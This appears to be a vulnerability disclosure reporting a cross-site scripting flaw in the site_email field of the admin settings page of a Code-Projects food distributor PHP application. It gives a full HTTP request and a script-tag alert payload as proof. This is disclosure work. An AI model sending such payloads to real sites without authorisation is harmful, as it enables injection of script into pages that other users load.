Cross-Site Scripting vulnerability in the `site_email` parameter of the Site Settings functionality

```
/fooddis/admin/save_settings.php
```

Vendor Homepage:

```
https://code-projects.org/food-distributor-site-in-php-with-source-code/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP
```

Affected Page:

```
/fooddis/admin/save_settings.php
```

The `site_email` parameter in the `save_settings.php` file of the Code-Projects Food Distributor System is vulnerable to XSS Injection. 

Proof of vulnerability:

<img width="927" alt="image" src="https://github.com/user-attachments/assets/e9adda01-77ea-4817-83e3-bc154775821c" />

<img width="1117" alt="image" src="https://github.com/user-attachments/assets/a71cd213-9cb7-4dbf-bca5-0477d8bf81cc" />





Request:

```
POST /fooddis/admin/save_settings.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 1783
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryErLqPQriiA6D3gDj
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/fooddis/admin/site_settings.php?success=true
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b409c2d300348e8d3c7d564868ff9e2f
Connection: keep-alive

------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_name"

Food Website
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_title"

Food Website
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_keyword"

Site
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_desc"

Food Website, established in 2018, is a well known ethic food distributor in Nigeria. With previous experience in food technology and research, Lumidek Associates Ltd. is the market leader in serving high quality and health promoting food products across Nigeria.
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="google_code"

09tghjpo987hpnjkb
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_email"

<script>alert('XSS')</script>
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="site_phone"

123456789
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="linkedin"

(+234)000 000 1353
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="facebook"

https://facebook.com
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="twitter"

CP
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="address"

142, Iju waterworks road, Agege, Lagos state.
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="city"

Eliozu road, off Airport road, Port Harcourt, Rivers state
------WebKitFormBoundaryErLqPQriiA6D3gDj
Content-Disposition: form-data; name="country"

Nigeria
------WebKitFormBoundaryErLqPQriiA6D3gDj--
```

payload

```
<script>alert('XSS')</script>
```

